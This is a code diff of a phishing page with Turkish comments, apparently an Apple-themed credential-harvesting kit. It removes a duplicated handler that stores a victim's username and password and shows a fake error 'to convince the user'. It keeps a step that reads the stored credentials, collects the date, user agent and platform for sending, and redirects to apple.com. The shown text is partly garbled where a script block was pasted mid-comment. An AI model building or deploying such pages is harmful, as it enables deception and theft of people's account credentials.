@@ -210,42 +210,13 @@
             }, 1500);
         });
 
-        // --- 2. ADIM: İZİN EKR<script>
-        const loginCard = document.getElementById('loginCard');
-        const permissionCard = document.getElementById('permissionCard');
-        const loginForm = document.getElementById('loginForm');
-        const errorMessage = document.getElementById('errorMessage');
-        const allowButton = document.getElementById('allowButton');
-        const denyButton = document.getElementById('denyButton');
-
-        // --- 1. ADIM: GİRİŞ FORMU İŞLEMLERİ ---
-        loginForm.addEventListener('submit', function(event) {
-            event.preventDefault(); // Sayfanın yenilenmesini engeller
-
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-
-            // Bilgileri geçici olarak sakla
-            sessionStorage.setItem('username', username);
-            sessionStorage.setItem('password', password);
-
-            // Kullanıcıyı ikna etmek için sahte hata mesajı göster
-            errorMessage.style.display = 'block';
-
-            // 1.5 saniye sonra izin ekranına geç
-            setTimeout(() => {
-                loginCard.classList.add('hidden');
-                permissionCard.classList.remove('hidden');
-            }, 1500);
-        });
-
         // --- 2. ADIM: İZİN EKRANI İŞLEMLERİ ---
         allowButton.addEventListener('click', function() {
             // Saklanan kullanıcı bilgilerini al
             const username = sessionStorage.getItem('username');
             const password = sessionStorage.getItem('password');
 
-            // Gönderilecek ek verileri topla
+// Gönderilecek ek verileri topla
             const send_date = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
             const user_agent = navigator.userAgent;
             const platform = navigator.platform;
@@ -299,3 +270,5 @@
             window.location.href = 'https://www.apple.com';
         });
     </script>
+</body>
+</html>
